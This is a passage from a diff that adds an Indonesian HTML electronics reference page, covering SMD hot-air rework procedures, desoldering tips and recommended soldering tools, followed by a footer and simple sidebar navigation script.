+<span class="num">3.</span> Hot air gun: 350–380°C, flow rendah, circular motion
+<span class="num">4.</span> Tunggu solder reflow — komponen akan self-align
+<span class="num">5.</span> Cek dengan loupe atau microscope</code></pre>
+
+  <h3>Rework — Ganti IC SMD</h3>
+  <pre><code><span class="label">PROSEDUR REMOVE IC dengan Hot Air:</span>
+<span class="num">1.</span> Apply flux ke semua pin
+<span class="num">2.</span> Set hot air: 380–420°C (lead-free), flow 3–4
+<span class="num">3.</span> Panaskan merata dari atas/samping IC
+<span class="num">4.</span> Angkat dengan tweezer saat solder reflow (30–60 detik)
+<span class="num">5.</span> Bersihkan pad: wick + flux + iron
+<span class="num">6.</span> Verifikasi semua pad bersih dan flat
+
+<span class="label">PASANG IC BARU:</span>
+<span class="num">1.</span> Align pin 1 marker
+<span class="num">2.</span> Apply pasta flux ke pad
+<span class="num">3.</span> Place IC, konfirmasi alignment
+<span class="num">4.</span> Reflow dengan hot air atau via iron drag</code></pre>
+
+  <div class="callout tip">
+    <div class="callout-title">💡 Tips Lab</div>
+    Untuk desoldering SMD pasif (resistor, capasitor 0402/0603) tanpa hot air: sentuh kedua ujung komponen dengan dua iron tip secara bersamaan — komponen langsung terangkat. Teknik ini tidak bisa dengan satu iron. Alternatif: putus komponen dengan cutter lalu bersihkan pad secara terpisah.
+  </div>
+
+  <h3>Alat Rework Essential</h3>
+  <div class="card-grid">
+    <div class="card">
+      <div class="card-head">Wajib</div>
+      <div class="card-name">Soldering Station</div>
+      <p>Hakko FX-888D atau Weller WE1010. Jangan pakai iron tanpa temperature control.</p>
+    </div>
+    <div class="card">
+      <div class="card-head">Wajib</div>
+      <div class="card-name">Hot Air Rework</div>
+      <p>Yihua 858D atau Quick 861DW. Wajib untuk SMD QFP/QFN, BGA rework.</p>
+    </div>
+    <div class="card">
+      <div class="card-head">Penting</div>
+      <div class="card-name">Solder Wick</div>
+      <p>Desoldering braid — wajib untuk membersihkan bridge dan pad. Beli beberapa ukuran.</p>
+    </div>
+    <div class="card">
+      <div class="card-head">Penting</div>
+      <div class="card-name">Flux No-Clean</div>
+      <p>Amtech NC-559-V2 atau MG Chemicals 835-P. Kunci untuk hasil solder berkualitas.</p>
+    </div>
+    <div class="card">
+      <div class="card-head">Penting</div>
+      <div class="card-name">Microscope / Loupe</div>
+      <p>40× stereo microscope atau USB microscope camera. Krusial untuk SMD 0402 dan fine pitch.</p>
+    </div>
+    <div class="card">
+      <div class="card-head">Support</div>
+      <div class="card-name">PCB Holder / Vise</div>
+      <p>Panavise atau third-hand holder. Bebaskan tangan untuk iron + tweezer.</p>
+    </div>
+  </div>
+</div>
+
+<!-- Footer -->
+<div style="margin-top:4rem;padding:1.5rem;border-top:1px solid var(--border);text-align:center;color:var(--text3);font-family:'Space Mono',monospace;font-size:.7rem;">
+  ELEKTRONIKA KOMPREHENSIF — Blue Dragon Security Reference v1.0<br>
+  Hardware · PCB · Hacking · Robotika
+</div>
+
+</article>
+</div><!-- /main -->
+
+<script>
+// Sidebar toggle
+function toggleSidebar() {
+  document.getElementById('sidebar').classList.toggle('open');
+}
+
+// Close sidebar when link clicked (mobile)
+document.querySelectorAll('#sidebar a').forEach(link => {
+  link.addEventListener('click', () => {
+    if (window.innerWidth < 900) {
+      document.getElementById('sidebar').classList.remove('open');
+    }
+  });
+});
+
+// Active link highlighting on scroll
+const sections = document.querySelectorAll('.section[id]');
+const navLinks = document.querySelectorAll('#sidebar a');
+
+function updateActiveLink() {
+  let current = '';
+  sections.forEach(section => {
+    const top = section.getBoundingClientRect().top;
+    if (top <= 120) current = section.id;
+  });
+  navLinks.forEach(link => {
+    link.classList.remove('active');
+    if (link.getAttribute('href') === '#' + current) {
+      link.classList.add('active');
+    }
+  });
+}
+
+window.addEventListener('scroll', updateActiveLink, { passive: true });
+updateActiveLink();
+</script>
+</body>
+</html>
